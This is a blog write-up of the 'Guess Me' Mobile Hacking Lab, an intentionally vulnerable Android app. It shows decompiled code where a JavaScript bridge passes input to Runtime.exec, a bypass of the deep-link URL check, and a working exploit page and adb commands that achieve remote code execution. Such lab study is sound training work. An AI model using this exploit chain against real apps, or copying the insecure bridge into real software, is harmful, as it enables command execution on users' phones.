---
layout: post
title: Guess Me - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, Android Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Guess Me](https://www.mobilehackinglab.com/course/lab-guess-me) lab is designed to explore a vulnerability in the loading of pages within a WebView in an Android application, which can lead to Remote Code Execution (RCE). <!--more--> Let's delve into discovering how we can achieve command execution.

### Introduction 

Upon opening the application, we encounter a text input to enter a number from 1 to 100 and see if we guess correctly. As there doesn't seem to be anything else of interest, let's examine the source code to understand what's happening behind the scenes.

### Static Analysis

Our investigation begins with a thorough examination of the `AndroidManifest.xml` file, where we discover an exported activity named `WebviewActivity`. However, before delving into the specifics of this activity, let's first inspect the `MainActivity` to understand the application's primary functionality.

```xml
<!-- AndroidManifest.xml -->
...
<activity android:name="com.mobilehackinglab.guessme.WebviewActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="mhl" android:host="mobilehackinglab"/>
            </intent-filter>
        </activity>
...
```

Looking at the `MainActivity` source code, we observe standard functionality for handling user interactions and game logic. However, our focus shifts to the `WebviewActivity`, which utilizes a WebView to render web content.

```java
//MainActivity
package com.mobilehackinglab.guessme;

import android.content.Intent;
....

/* loaded from: classes3.dex */
public final class MainActivity extends AppCompatActivity {
    private ImageButton aboutusbtn;
    private int attempts;
    private Button exitButton;
    private Button guessButton;
    private EditText guessEditText;
    private final int maxAttempts = 10;
    private Button newGameButton;
    private TextView resultTextView;
    private int secretNumber;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0892R.layout.activity_main);
        View findViewById = findViewById(C0892R.C0895id.resultTextView);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        this.resultTextView = (TextView) findViewById;
        View findViewById2 = findViewById(C0892R.C0895id.guessEditText);
        Intrinsics.checkNotNullExpressionValue(findViewById2, "findViewById(...)");
        this.guessEditText = (EditText) findViewById2;
        View findViewById3 = findViewById(C0892R.C0895id.guessButton);
        Intrinsics.checkNotNullExpressionValue(findViewById3, "findViewById(...)");
        this.guessButton = (Button) findViewById3;
        View findViewById4 = findViewById(C0892R.C0895id.newGameButton);
        Intrinsics.checkNotNullExpressionValue(findViewById4, "findViewById(...)");
        this.newGameButton = (Button) findViewById4;
        View findViewById5 = findViewById(C0892R.C0895id.exitButton);
        Intrinsics.checkNotNullExpressionValue(findViewById5, "findViewById(...)");
        this.exitButton = (Button) findViewById5;
        View findViewById6 = findViewById(C0892R.C0895id.aboutus);
        Intrinsics.checkNotNullExpressionValue(findViewById6, "findViewById(...)");
        this.aboutusbtn = (ImageButton) findViewById6;
        ImageButton imageButton = this.aboutusbtn;
        Button button = null;
        if (imageButton == null) {
            Intrinsics.throwUninitializedPropertyAccessException("aboutusbtn");
            imageButton = null;
        }
        imageButton.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$0(MainActivity.this, view);
            }
        });
        startNewGame();
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
            button2 = null;
        }
        button2.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda1
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$1(MainActivity.this, view);
            }
        });
        Button button3 = this.newGameButton;
        if (button3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("newGameButton");
            button3 = null;
        }
        button3.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda2
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$2(MainActivity.this, view);
            }
        });
        Button button4 = this.exitButton;
        if (button4 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("exitButton");
        } else {
            button = button4;
        }
        button.setOnClickListener(new View.OnClickListener() { // from class: com.mobilehackinglab.guessme.MainActivity$$ExternalSyntheticLambda3
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                MainActivity.onCreate$lambda$3(MainActivity.this, view);
            }
        });
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$0(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        Intent intent = new Intent(this$0, WebviewActivity.class);
        this$0.startActivity(intent);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$1(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.validateGuess();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$2(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.startNewGame();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static final void onCreate$lambda$3(MainActivity this$0, View it) {
        Intrinsics.checkNotNullParameter(this$0, "this$0");
        this$0.finish();
    }

    private final void startNewGame() {
        this.secretNumber = Random.Default.nextInt(1, TypedValues.TYPE_TARGET);
        this.attempts = 0;
        TextView textView = this.resultTextView;
        EditText editText = null;
        if (textView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("resultTextView");
            textView = null;
        }
        textView.setText("Guess a number between 1 and 100");
        EditText editText2 = this.guessEditText;
        if (editText2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
        } else {
            editText = editText2;
        }
        editText.getText().clear();
        enableInput();
    }

    private final void validateGuess() {
        EditText editText = this.guessEditText;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        Integer userGuess = StringsKt.toIntOrNull(editText.getText().toString());
        if (userGuess != null) {
            this.attempts++;
            if (userGuess.intValue() < this.secretNumber) {
                displayMessage("Too low! Try again.");
            } else if (userGuess.intValue() > this.secretNumber) {
                displayMessage("Too high! Try again.");
            } else {
                displayMessage("Congratulations! You guessed the correct number " + this.secretNumber + " in " + this.attempts + " attempts.");
                disableInput();
            }
            if (this.attempts == this.maxAttempts) {
                displayMessage("Sorry, you've run out of attempts. The correct number was " + this.secretNumber + '.');
                disableInput();
                return;
            }
            return;
        }
        displayMessage("Please enter a valid number.");
    }

    private final void displayMessage(String message) {
        TextView textView = this.resultTextView;
        EditText editText = null;
        if (textView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("resultTextView");
            textView = null;
        }
        textView.setText(message);
        EditText editText2 = this.guessEditText;
        if (editText2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
        } else {
            editText = editText2;
        }
        editText.getText().clear();
    }

    private final void disableInput() {
        EditText editText = this.guessEditText;
        Button button = null;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        editText.setEnabled(false);
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
        } else {
            button = button2;
        }
        button.setEnabled(false);
    }

    private final void enableInput() {
        EditText editText = this.guessEditText;
        Button button = null;
        if (editText == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessEditText");
            editText = null;
        }
        editText.setEnabled(true);
        Button button2 = this.guessButton;
        if (button2 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("guessButton");
        } else {
            button = button2;
        }
        button.setEnabled(true);
    }
}
```

The `WebviewActivity` piques our interest. This activity utilizes a WebView to render web content. Upon opening the activity, the `handleDeepLink` function is invoked, which verifies if the activity is launched via an intent. If deemed valid, the `loadDeepLink` function is called, after being validated by the `isValidDeepLink` function. Otherwise, a default `index.html` is loaded.

The `isValidDeepLink` function checks the URI, ensuring it adheres to specific criteria, including the presence of the scheme `mhl://` or `https://`, a host part with the value `mobilehackinglab`, and a query parameter `url`. Thus, a valid URI might be `mhl://mobilehackinglab?url=bernasv.com`

```java
//WebViewActivity
package com.mobilehackinglab.guessme;

...
import kotlin.text.StringsKt;

/* loaded from: classes3.dex */
public final class WebviewActivity extends AppCompatActivity {
    private WebView webView;

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0892R.layout.activity_web);
        View findViewById = findViewById(C0892R.C0895id.webView);
        Intrinsics.checkNotNullExpressionValue(findViewById, "findViewById(...)");
        this.webView = (WebView) findViewById;
        WebView webView = this.webView;
        WebView webView2 = null;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        WebSettings webSettings = webView.getSettings();
        Intrinsics.checkNotNullExpressionValue(webSettings, "getSettings(...)");
        webSettings.setJavaScriptEnabled(true);
        WebView webView3 = this.webView;
        if (webView3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView3 = null;
        }
        webView3.addJavascriptInterface(new MyJavaScriptInterface(), "AndroidBridge");
        WebView webView4 = this.webView;
        if (webView4 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView4 = null;
        }
        webView4.setWebViewClient(new WebViewClient());
        WebView webView5 = this.webView;
        if (webView5 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
        } else {
            webView2 = webView5;
        }
        webView2.setWebChromeClient(new WebChromeClient());
        loadAssetIndex();
        handleDeepLink(getIntent());
    }

    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, android.app.Activity
    public void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleDeepLink(intent);
    }

    private final void handleDeepLink(Intent intent) {
        Uri uri = intent != null ? intent.getData() : null;
        if (uri != null) {
            if (isValidDeepLink(uri)) {
                loadDeepLink(uri);
            } else {
                loadAssetIndex();
            }
        }
    }

    private final boolean isValidDeepLink(Uri uri) {
        if ((Intrinsics.areEqual(uri.getScheme(), "mhl") || Intrinsics.areEqual(uri.getScheme(), "https")) && Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
            String queryParameter = uri.getQueryParameter("url");
            return queryParameter != null && StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, (Object) null);
        }
        return false;
    }

    private final void loadDeepLink(Uri uri) {
        String fullUrl = String.valueOf(uri.getQueryParameter("url"));
        WebView webView = this.webView;
        WebView webView2 = null;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl(fullUrl);
        WebView webView3 = this.webView;
        if (webView3 == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
        } else {
            webView2 = webView3;
        }
        webView2.reload();
    }

    private final void loadAssetIndex() {
        WebView webView = this.webView;
        if (webView == null) {
            Intrinsics.throwUninitializedPropertyAccessException("webView");
            webView = null;
        }
        webView.loadUrl("file:///android_asset/index.html");
    }

    /* compiled from: WebviewActivity.kt */
    @Metadata(m30d1 = {"\u0000\u001c\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0002\b\u0002\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0002\b\u0002\b\u0086\u0004\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u0003\u001a\u00020\u00042\u0006\u0010\u0005\u001a\u00020\u0004H\u0007J\u0010\u0010\u0006\u001a\u00020\u00072\u0006\u0010\b\u001a\u00020\u0004H\u0007¨\u0006\t"}, m29d2 = {"Lcom/mobilehackinglab/guessme/WebviewActivity$MyJavaScriptInterface;", "", "(Lcom/mobilehackinglab/guessme/WebviewActivity;)V", "getTime", "", "Time", "loadWebsite", "", "url", "app_debug"}, m28k = 1, m27mv = {1, 9, 0}, m25xi = ConstraintLayout.LayoutParams.Table.LAYOUT_CONSTRAINT_VERTICAL_CHAINSTYLE)
    /* loaded from: classes3.dex */
    public final class MyJavaScriptInterface {
        public MyJavaScriptInterface() {
        }

        @JavascriptInterface
        public final void loadWebsite(String url) {
            Intrinsics.checkNotNullParameter(url, "url");
            WebView webView = WebviewActivity.this.webView;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            webView.loadUrl(url);
        }

        @JavascriptInterface
        public final String getTime(String Time) {
            Intrinsics.checkNotNullParameter(Time, "Time");
            try {
                Process process = Runtime.getRuntime().exec(Time);
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                String readText = TextStreamsKt.readText(reader);
                reader.close();
                return readText;
            } catch (Exception e) {
                return "Error getting time";
            }
        }
    }
}
```
Let's try to open the app with this deep link:

```bash
adb shell am start -a android.intent.action.VIEW -d  "mhl://mobilehackinglab?url=bernasv.com?test=mobilehackinglab.com"
```

However, we get redirected to the `index.html` instead of your website. Upon revisiting the code, we found that the query parameter part needs to end with `mobilehackinglab.com`. This can be bypassed easily by appending something like `oursite.com?data=mobilehackinglab.com`.

So lets try to open the app again with this: 

```bash
adb shell am start -a android.intent.action.VIEW -d  "mhl://mobilehackinglab?url=bernasv.com?test=mobilehackinglab.com"
```

Now that we've successfully opened our site, what actions can we take next? Upon inspecting the WebView interface, we discover the presence of a `MyJavaScriptInterface` containing functions `loadWebsite` and `getTime`. Upon closer examination of the `getTime` function, we realize that we have control over the command to be executed. Armed with this knowledge, we can serve a malicious HTML file and prompt the application to load it via a deep link, thereby granting us remote code execution.

```java
/WebViewActivity -> MyJavaScriptInterface
public final class MyJavaScriptInterface {
        public MyJavaScriptInterface() {
        }

        @JavascriptInterface
        public final void loadWebsite(String url) {
            Intrinsics.checkNotNullParameter(url, "url");
            WebView webView = WebviewActivity.this.webView;
            if (webView == null) {
                Intrinsics.throwUninitializedPropertyAccessException("webView");
                webView = null;
            }
            webView.loadUrl(url);
        }

        @JavascriptInterface
        public final String getTime(String Time) {
            Intrinsics.checkNotNullParameter(Time, "Time");
            try {
                Process process = Runtime.getRuntime().exec(Time);
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                InputStreamReader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                String readText = TextStreamsKt.readText(reader);
                reader.close();
                return readText;
            } catch (Exception e) {
                return "Error getting time";
            }
        }
}
```

### Exploiting the Application

First, let's create and host an `exploit.html` file that communicates with `MyJavaScriptInterface` using the exposed method `getTime()` with the parameter being the command to run using the `AndroidBridge` defined in the `WebviewActivity`.

```html
<!-- exploit.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>

<h1>Exploit guess app</h1>
<p id="result"></p>


<script>

    //Change to your command
    var result = AndroidBridge.getTime("uname -a");
    var lines = result.split('\n');
    var command = lines[0];
    var fullMessage = "Command: " + command;
    document.getElementById('result').innerText = fullMessage;

</script>

</body>
</html>

```

Now, all we need to do is serve this HTML file using Python.

```bash
python -m http.server 80
```

And start our app to get the URL of your web server to achieve remote code execution.

```bash
adb shell am start -a android.intent.action.VIEW -d  "mhl://mobilehackinglab?url=http://192.168.0.109/exploit.html?test=mobilehackinglab.com"
```

Upon the page loading, we successfully achieve remote code execution on the victim's phone.

### Conclusion

This lab serves as a valuable lesson in understanding the security implications of loading URLs within a WebView in Android applications. By exploiting vulnerabilities such as insecure JavaScript interfaces, attackers can achieve Remote Code Execution and compromise the integrity of the application. For a hands-on experience with these concepts, visit the lab at [MobileHackingLab - Guess Me](https://www.mobilehackinglab.com/course/lab-guess-me). Embark on a journey of discovery and bolster your expertise in mobile security.
